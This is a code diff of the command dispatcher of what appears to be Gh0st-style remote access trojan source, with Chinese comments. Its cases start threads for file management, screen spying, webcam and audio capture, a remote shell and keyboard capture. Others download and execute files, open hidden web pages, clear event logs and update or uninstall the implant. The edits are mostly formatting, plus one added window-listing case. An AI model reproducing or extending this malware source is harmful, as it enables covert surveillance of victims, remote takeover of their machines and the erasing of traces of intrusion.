@@ -56,23 +56,23 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	case COMMAND_ACTIVED:
 		InterlockedExchange((LONG *)&m_bIsActived, true);
 		break;
-	case COMMAND_LIST_DRIVE: // 文件管理
+	case COMMAND_LIST_DRIVE:		// 文件管理
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
 			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
 		break;
-	case COMMAND_SCREEN_SPY: // 屏幕查看
+	case COMMAND_SCREEN_SPY:		// 屏幕查看
  		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
  			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
 		break;
-	case COMMAND_WEBCAM: // 摄像头
+	case COMMAND_WEBCAM:			// 摄像头
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_AUDIO: // 摄像头
+	case COMMAND_AUDIO:				// 摄像头
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_SHELL: // 远程sehll
+	case COMMAND_SHELL:				// 远程shell-CMD
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
 		break;
@@ -80,39 +80,43 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_SYSTEM: 
+	case COMMAND_SYSTEM:			// 进程
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
+	case COMMAND_WSLIST:			// 窗口
+		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_WindowManager,
+			(LPVOID)m_pClient->m_Socket, 0, NULL);
+		break;
 
-	case COMMAND_DOWN_EXEC: // 下载者
+	case COMMAND_DOWN_EXEC:			// 下载者
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
 			(LPVOID)(lpBuffer + 1), 0, NULL, true);
-		Sleep(100); // 传递参数用
+		Sleep(100);					// 传递参数用
 		break;
-	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
+	case COMMAND_OPEN_URL_SHOW:		// 显示打开网页
 		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
 		break;
-	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
+	case COMMAND_OPEN_URL_HIDE:		// 隐藏打开网页
 		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
 		break;
-	case COMMAND_REMOVE: // 卸载,
+	case COMMAND_REMOVE:			// 卸载,
 		UnInstallService();
 		break;
-	case COMMAND_CLEAN_EVENT: // 清除日志
+	case COMMAND_CLEAN_EVENT:		// 清除日志
 		CleanEvent();
 		break;
 	case COMMAND_SESSION:
 		CSystemManager::ShutdownWindows(lpBuffer[1]);
 		break;
-	case COMMAND_RENAME_REMARK: // 改备注
+	case COMMAND_RENAME_REMARK:		// 改备注
 		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
 		break;
-	case COMMAND_UPDATE_SERVER: // 更新服务端
+	case COMMAND_UPDATE_SERVER:		// 更新服务端
 		if (UpdateServer((char *)lpBuffer + 1))
 			UnInstallService();
 		break;
-	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
+	case COMMAND_REPLAY_HEARTBEAT:	// 回复心跳包
 		break;
 	}	
 }
